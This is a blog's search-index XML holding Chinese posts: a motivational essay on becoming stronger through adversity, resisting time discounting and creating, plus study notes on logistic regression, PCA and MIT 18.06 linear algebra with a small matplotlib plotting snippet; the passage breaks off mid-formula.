<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>人是怎么变强的</title>
      <link href="/2023/12/12/%E4%BA%BA%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%98%E5%BC%BA%E7%9A%84/"/>
      <url>/2023/12/12/%E4%BA%BA%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%98%E5%BC%BA%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>人想要变强就三点 —— 获得黑色生命力，抵抗时间扭曲，和创造。</p><p>而许多人连第一个坎都是捱不过去的。</p><h2 id="1"><a class="markdownIt-Anchor" href="#1">#</a> 1</h2><p>先来说说何谓黑色生命力。</p><p>它是指，不断的被痛苦压住，又不断的翻身把痛苦给予痛击，并在这个互相搏击的过程中，获得一种更加旺盛的生命力。</p><p>不知道你们有没有看过这句话啊，我在第一次看见的时候，就被深深的共鸣了 ——</p><p>“每个优秀的人，都有一段至暗时光。”</p><p>在许多人眼中，强大的人都是这样的：从小学一路学霸到研究生，从小员工一路打怪升级到副总裁，人挡杀人佛挡杀佛，雷厉风行见招拆招……</p><p>这是很多人都会有的一种线性思维，觉得身边的一切都是按照一种直线的、均匀不变的方式运行着。牛逼的人就该从小牛逼到大，屌丝逆袭总是只存在于地摊小说中。</p><p>然而，真实的世界却并非如此。</p><p>因为在真实世界中，绝大多数事与人的发展都不是 “线性” 的，生活充满了笑话和变数。</p><p>今天你可能刚中了 500 万的彩票，结果出门就被车撞了；今天你可能刚求婚成功，结果婚礼那天老婆就上了前男友的保时捷。</p><p>ww，生活远比小说要精彩。</p><p>总之，每个人的人生函数都不可能是一根直线，而是一条不断震荡的曲线。</p><p>而几乎每一个人的人生曲线，都无可避免的，有过至少一段 “剧烈滑落” 的区间，那就是每个人都必然会经历的 “至暗时光”。</p><p>强大的人就诞生于此。</p><p>因为在这段剧烈滑落的波谷中，有人爬了上来，有人却再也没有，他的自信与勇气在被 “至暗时光” 彻底击碎后，就再也没能回来。</p><p>在这里，他需要经历的远比他尚未成熟的心灵想象得更多，比如，世界观的重构，三观的崩坏，不公平的碾压，自我怀疑的低谷……</p><p>但如果存活于此，就会得到一种「黑色生命力」（Black vitality）。</p><p>每个人身上都有一种生命力，支撑着我们活着，度过每一天。<br>而有一种生命力，是只能在经受过失望、逆境或创伤，并渡过、幸存下来的人才能够获得的。</p><p>拥有黑色生命力的人几乎是无敌的，说得中二一点，他们就像是 “从地狱回来了的人”。</p><p>在情绪方面，他们熟悉痛苦，会比没有经历过重大创伤的人更懂得如何处理痛苦，痛苦的人比快乐的人共情能力更强，当然治愈力也更好。</p><p>在认知方面，他们会有一种对复杂现实的理解能力，对真实世界的狗血和魔幻，他们的认知会高于一般人。</p><p>比如 “世界上我最爱的人却伤害了我”，“我这么努力了却还是没有回报” 等等，这种换一般小女生会哭天抢地的事情，他们不再会太过 care。</p><p>他们更懂得从不同的视角看待真实，当别人都在抱怨 “为什么是我？” 的时候，他们已经能自我安慰 “为什么不能是我？”</p><p>因为，在度过创伤的日子里，他们体会到了自己比想象中更强大，更相信自己是可以依靠的</p><p>所以，人想要变强，首先就要从低谷中走出来，并且得到 “黑色生命力”。</p><p>我也是从多次这种低谷走出来，给你一些我的生命力小经验：</p><p>1、接纳自己的一切负面情绪</p><p>不要压抑自己，难过时就要理解自己在难过，最好可以去大哭一场，只有先接纳你的负面情绪，你才能在最后与它和解。</p><p>2、相信自己的痛苦是有意义的</p><p>当人在经历一件事感受到煎熬时，如果能想到完成这件事的动机和意义时，其实就不会那么难过了。</p><p>人其实并不是害怕痛苦，而是害怕毫无意义的痛苦。所以，要相信你所有经历的，都是为了让你成长呀。</p><p>3、不要给自己贴标签</p><p>在自我怀疑的过程中，你可能会不自觉的给自己贴很多标签，比如：我是个很自闭的人，我什么事都做不好，我没有人喜欢……</p><p>停！当你意识到你开始通过一件事情评价整个自己的时候，就要打住，并且要不断找证据去推翻这个标签，比如：</p><p>真的吗？真的从小到大没有任何一个人愿意和我做朋友吗？真的我从来没有在人前主动说过一句话吗？我真的没有和人聊天很开心的时候吗？</p><p>你会找到许多证据去推翻这个标签，并且要相信，你会蜕变成一个更好的，更值得的人。</p><p>有人说，曾经经历过的创伤会形成一道伤疤。</p><p>但一道伤疤，同时也是一枚勋章，它提醒着你曾经有过的抗争、取得的胜利。面对黑暗，你仍然有穿越它并获得力量的权利。</p><p>对了，看到这里说明你也是个有独立思考能力，能够认真阅读的人，希望你花一秒给我点个赞，也能加深对这个回答的记忆点哦～</p><p>因为这是我很用心写的内容，如果你能给我一个赞支持一下就太好啦</p><h2 id="2"><a class="markdownIt-Anchor" href="#2">#</a> 2</h2><p>再来说说抵抗时间扭曲是怎么回事。</p><p>这个概念有点悬，我先说说你我应该都有的一种感觉。</p><p>越是长大，我们越会时间过得越来越快。连《进击的巨人》都是 7 年前的动漫了，没想到吧？</p><p>但回顾童年时，我们却感觉时间过得很慢，每天都非常充实，好像在另一个星球里放肆地玩了很久。</p><p>对这种时间感知度不同的现象，网上有一个很有趣的解释，</p><p>“五岁的时候，人的记忆只有五年，这时候过一年，到六岁时，记忆增加了五分之一。<br>六岁到七岁，记忆增加了六分之一。<br>七岁到八岁记忆就只增加了七分之一。<br>以此类推，到了二十岁的时候，记忆便只增加二十分之一。<br>这一年的时光虽然没变，但是参照物变了，所以大家就感觉时间过得快了。<br>可能等你六十岁的的时候，过一年记忆只增加六十分之一，那时时间就过得更快了。‘”</p><p>所以即使时间从未改变过，但在我们的主观感觉上，时间就被 “扭曲” 了。</p><p>而一般人，很难察觉到时间扭曲对自己产生的影响。这个影响在心理学上叫做「时间贴现」（Time Discounting）。</p><p>它是指，当时间流逝得越快，我们对做一件事的未来价值估计就会越下降。我们会越发感受不到未来的存在，而只关注当下怎么样。</p><p>所以，许多人才会有这样的心态：</p><p>学这个东西干什么？10 年后都不知道这个岗位还在不在。</p><p>—— 但你学或不学，10 年后都会到来，区别在于，如果学了，到时你还多了一种可能性。</p><p>做这个事情干什么？又看不到什么效果。</p><p>—— 但你做或不做，这件事的效果都是会存在的。区别在于，它是会在当下就对你产生影响，还是在未来会对你产生影响。</p><p>毕竟我们是根据做一件事到底有多少价值去行动的…… 所以对时间的认知度，会直接影响到我们的行为。</p><p>时间就像一面透镜，会对我们对价值的判断进行扭曲，会让我们变得短视，沉迷即时满足，很难踏实下来去为自己做一件有长期价值的事情。</p><p>宁愿先开一把王者享受当下，也不愿意为了下个月的期末考试认真一把。</p><p>但强大的人，往往会刻意锻炼自己抵抗时间扭曲的能力，不被时间贴现所影响。他们对时间的敏感度超于常人。</p><p>所以想要变强，就要察觉到时间对你的诅咒，并且有意识的去克服它。给你两个小建议：</p><p>1、每天花 1 个小时去做一件有长期价值的事</p><p>比如：培养一个爱好，学习一门技能，读 10 页书……</p><p>一定要保证在很长的一个周期内你都会坚持去做它，得到什么结果无所谓，重要的是得让自己每天都有一点进步，感受到时间真实的流逝。</p><p>2、每天为自己的生活找点变化</p><p>不要让自己每一天都只做一成不变的事情，因为越是只做重复性的动作，大脑就越会倾向于遗忘这段记忆！（因为没什么营养和新鲜感）</p><p>所以要每天都找点和昨天不一样的东西去做，比如偶尔换一条路去上学，每天都换一张手机壁纸，定期更新一下桌面的绿植……</p><p>这些微小的变化，都会留在你经历过的每一段时间，每一段记忆里。</p><h2 id="3"><a class="markdownIt-Anchor" href="#3">#</a> 3</h2><p>最后说说，强大的人是怎么去创造的。</p><p>不知道你有没有注意过，我们每个人在生活中的角色都是消费者 —— 不是指只有花钱的那种消费，时间，注意力的消费也算。</p><p>你花几十块钱买了一杯奶茶，一根口红，是金钱上的消费。<br>你花了两个小时去刷抖音，看电影，是时间上的消费。<br>你一边心不在焉的应付作业一边兴致满满的和朋友聊天，是注意力上的消费。</p><p>你仔细想一想，我们的生活中是不是充满了各种各样的消费？我们用金钱，时间，注意力去为自己换取一些物质，娱乐，人际关系～</p><p>但只有极少数的人，会去主动尝试把消费模式切换成创造模式。也就是不仅会消费，还会主动去创造。</p><p>当你看到了一篇优秀的文章，你花费时间去阅读消费了它。但你有没有想过自己也按照这篇文章的结构和手法，去创造一篇文章呢？</p><p>当你看到了一部很精彩的悬疑电影，你花费注意力去观看消费了它。但你有没有想过去主动拆解作者埋伏笔和设线索的手法，去做一期电影解析呢？</p><p>哪怕是一个会打游戏的人，都不要仅仅停留在 “玩” 的这个消费层面。当然不用也去做一个游戏，主动寻找游戏彩蛋，创造新的玩法，写攻略分享出去，也是一种创造。</p><p>* 一些自由度极高的游戏里这种大神经常出没，比如《塞尔达传说》和《我的世界》。</p><p>一件事物最终呈现在消费者面前，背后一定是经过了层层设计和思考的 ——</p><p>而当你不满足于它的表象，试着将它用你的方式呈现在大众面前的时候，你就算是从一个消费者变为了创造者。</p><p>这是一个需要调动深度思考能力和执行力的过程，也是厉害的人和普通人的思维和行动模式的差别。</p><p>应试教育给我们的学习暗示，很多都是错的。所以你需要从填鸭式学习，改变为创造式学习。</p><p>这也是为什么我一直非常敬佩同人作家和画手的原因，他们是在真正的用兴趣去推动自己的创造力，用创作去平自己的意难平，而不是单纯的 “磕到了磕到了！”</p><p>当你开始创造时，你会感受到比你单纯停留在「消费」时更高层级、更丰富的体验感。</p><p>所以，如果你有了感兴趣的东西，试着不要只是去消费它，而是去参与创造它 ——</p><p>1、保持好奇心和探索欲</p><p>好奇心是一切创造的起点，它可以帮我们保持尝试和探索新事物的源动力，即使是从大家司空见惯的事物中，也能发现许多值得探索的点。</p><p>多去尝试新事物，多从旧事物中找到新细节，以及，时刻保持问自己 “为什么” 的能力。</p><p>2、没事多去 “拆” 东西</p><p>很多熊孩子小时候都喜欢拆东西，虽然这种行为经常挨打，但这也正是我们了解一样事物构造最简单粗暴的方式。</p><p>长大后虽然我们不能再这么破坏东西了，但我们仍然可以有许多可 “拆” 的东西：</p><ul><li>它是由哪些部分组成的？组装逻辑是什么？</li><li>这些部分还可以和什么东西联系起来？</li><li>我要怎么才能用上它？</li></ul><p>最后，再为你总结一下，人是怎么变强的？</p><p>首先是能够从低谷中获得黑色生命力，其次是对抗时空扭曲的能力，最后，从消费者成为创造者。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据科学导论+学习过程</title>
      <link href="/2023/12/12/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C/"/>
      <url>/2023/12/12/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>大概把这次作业 6 的实现过程记录一下吧，因为在过程中发现了很多数据分析很有用的一些知识，这里记录一下，以后可能会用到。<br><a href="https://zhuanlan.zhihu.com/p/629713770">R 语言实战 - 基于 Logistic 回归模型的构建及验证 - 文章依据</a><br><a href="https://zhuanlan.zhihu.com/p/535482448"> R 语言 Logistic 回归～变量筛选 </a><br><a href="https://zhuanlan.zhihu.com/p/31446651">我该咋筛选变量进入多因素回归</a><br><a href="https://www.zhihu.com/question/36730804"> logistics 回归建立预后模型过程中自变量太多，如何筛选？</a><br>上面是学习过程中学习的文章。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主成分析+奇异值分解</title>
      <link href="/2023/12/10/%E4%B8%BB%E6%88%90%E5%88%86%E6%9E%90+%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3/"/>
      <url>/2023/12/10/%E4%B8%BB%E6%88%90%E5%88%86%E6%9E%90+%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="主成分析"><a class="markdownIt-Anchor" href="#主成分析">#</a> 主成分析</h2><h3 id="一背景"><a class="markdownIt-Anchor" href="#一背景">#</a> 一，背景</h3><p>在现在很多的领域的研究和应用中，往往需要对反映事物的多个变量进行大量的观测，收集较多的数据来进行分析。多变量大样本会对研究和应用提供了丰富的信息，一定程度上增加了数据采集工作量，许多变量可能存在相关性，从而增加了问题分析的复杂性。<br>需要找到一个合理的方法，在减少需要分析的指标同时，尽量减少原来指标包含信息的损失，以到达对收集数据进行全面分析的目的。由于各个变量之间存在相关关系，因此可能用比较少的综合指标分别综合存在于各变量中的各类信息。主成分分析与因子分析就属于这类降维的方法。</p><h3 id="二问题描述"><a class="markdownIt-Anchor" href="#二问题描述">#</a> 二，问题描述</h3><p>比方说某些学生的各个成绩统计：<br><img src="https://img-blog.csdn.net/20150304195359136" alt="成绩"><br>首先，假设这些科目成绩不相关，也就是说某一科目考多少分与其他科目没有关系。那么一眼就能看出来，数学、物理、化学这三门课的成绩构成了这组数据的主成分（很显然，数学作为第一主成分，因为数学成绩拉的最开）。为什么一眼能看出来？因为坐标轴选对了！下面再看一组学生的数学、物理、化学、语文、历史、英语成绩统计，见表 2，还能不能一眼看出来：<br><img src="https://img-blog.csdn.net/20150304195508947" alt="数学成绩"><br>我们似乎无法直接看出这组数据的主成分，因为在坐标系下这组数据分布的很散乱。</p><h3 id="三数据降维"><a class="markdownIt-Anchor" href="#三数据降维">#</a> 三，数据降维</h3><p>为了说明什么是数据的主成分，先从数据降维开始。降维其实就是把高维空间内的一系列点观察其是否有相关性，然后通过数据中心化（平移）和旋转的方式进行降维。一般来说 n 维空间的 n 个点一定能在 n-1 维子空间中分析。<br>上面所讲述的，认为在数据降维没有丢掉任何东西，因为这些数据在平面的第三个维度分量都为 0。现在假设这些数据在 z 轴有一些很小的抖动，那么我们仍然用上述的二维表示这些数据，理由是我们可以认为这两个轴的信息是数据的主成分，<br>PCA 的思想就是将 n 维特征映射到 k 维上，这 k 维是全新的正交特征。这 k 维特征称为主成分，是重新构造出来的 k 维特征，而不是简单地从 n 维特征中去除其余 n-k 维特征。</p><h3 id="pca实例"><a class="markdownIt-Anchor" href="#pca实例">#</a> PCA 实例</h3><p>![[Pasted image 20231210204106.png]]<br>   行代表了样例，列代表特征，这里有 10 个样例，每个样例两个特征。可以这样认为，有 10 篇文档，x 是 10 篇文档中 “learn” 出现的 TF-IDF，y 是 10 篇文档中 “study” 出现的 TF-IDF。<br>  <strong>第一步</strong>，分别求 x 和 y 的平均值，然后对于所有的样例，都减去对应的均值。这里 x 的均值是 1.81，y 的均值是 1.91，那么一个样例减去均值后即为（0.69,0.49），得到<br>  ![[Pasted image 20231210204123.png]]<br>       <strong>第二步</strong>，求特征协方差矩阵，如果数据是 3 维，那么协方差矩阵是<br>       ![[Pasted image 20231210204132.png]]<br>   这里只有 x 和 y，求解得<br>   对角线上分别是 x 和 y 的方差，非对角线上是协方差。协方差是衡量两个变量同时变化的变化程度。协方差大于 0 表示 x 和 y 若一个增，另一个也增；小于 0 表示一个增，一个减。如果ｘ和ｙ是统计独立的，那么二者之间的协方差就是０；但是协方差是０，并不能说明ｘ和ｙ是独立的。协方差绝对值越大，两者对彼此的影响越大，反之越小。协方差是没有单位的量，因此，如果同样的两个变量所采用的量纲发生变化，它们的协方差也会产生树枝上的变化。<br><strong>第三步</strong>，求协方差的特征值和特征向量，得到<br>！[[Pasted image 20231210204204.png]]<br> 上面是两个特征值，下面是对应的特征向量，特征值 0.0490833989 对应特征向量为，这里的特征向量都归一化为单位向量。<br><strong>第四步</strong>，将特征值按照从大到小的顺序排序，选择其中最大的 k 个，然后将其对应的 k 个特征向量分别作为列向量组成特征向量矩阵。<br>这里特征值只有两个，我们选择其中最大的那个，这里是 1.28402771，对应的特征向量是 (-0.677873399, -0.735178656) T。<br>第五步，将样本点投影到选取的特征向量上。假设样例数为 m，特征数为 n，减去均值后的样本矩阵为 DataAdjust (m<em>n)，协方差矩阵是 n</em>n，选取的 k 个特征向量组成的矩阵为 EigenVectors (n*k)。那么投影后的数据 FinalData 为</p><p>FinalData(10<em>1) = DataAdjust(10</em>2 矩阵) x 特征向量 (-0.677873399, -0.735178656) T<br>![[Pasted image 20231210204237.png]]<br> 这样，就将原始样例的 n 维特征变成了 k 维，这 k 维就是原始特征在 k 维上的投影。<br>上面的数据可以认为是 learn 和 study 特征融合为一个新的特征叫做 LS 特征，该特征基本上代表了这两个特征。上述过程如下图 2 描述</p><p><strong>总结一下就是求协方差矩阵，矩阵中方差大的（即那个向量方向上分散大的）可以认为是主要的特征，那么我们可以将数据投影到这个向量上。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能的数学基础</title>
      <link href="/2023/11/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>作为课程的学习，顺便自己也学习一下机器学习的基础和相关的数学基础，巩固下基础吧。</p></blockquote><p>基础一定是线性代数。–先线性代数进行学习吧。课程为 MIT 18.06</p><h1 id="线性代数"><a class="markdownIt-Anchor" href="#线性代数">#</a> 线性代数</h1><h3 id="第一讲方程组的几何解释"><a class="markdownIt-Anchor" href="#第一讲方程组的几何解释">#</a> 第一讲：方程组的几何解释</h3><p>我们从求解线性方程组来开始这门课，从一个普通的例子讲起：方程组有 2 个未知数，一共有 2 个方程，分别来看方程组的 “行图像” 和 “列图像”。</p><p>有方程组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>2</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}2x&amp;-y&amp;=0\\-x&amp;+2y&amp;=3\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，写作矩阵形式有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}2&amp;-1\\-1&amp;2\end{bmatrix}\begin{bmatrix}x\\y\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>，通常我们把第一个矩阵称为系数矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，将第二个矩阵称为向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，将第三个矩阵称为向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，于是线性方程组可以表示为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>x</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">Ax=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>。<br>我们来看行图像，即直角坐标系中的图像：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line">x = [-<span class="number">2</span>, <span class="number">2</span>, -<span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line">y = [-<span class="number">4</span>, <span class="number">4</span>, <span class="number">0.5</span>, <span class="number">2.5</span>]</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line">plt.axhline(y=<span class="number">0</span>, c=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">plt.axvline(x=<span class="number">0</span>, c=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.plot(x[:<span class="number">2</span>], y[:<span class="number">2</span>], x[<span class="number">2</span>:], y[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">plt.draw()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/chapter01_1_0.png?raw=true" alt="演示"><br>上图是我们都很熟悉的直角坐标系中两直线相交的情况，接下来我们按列观察方程组<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo 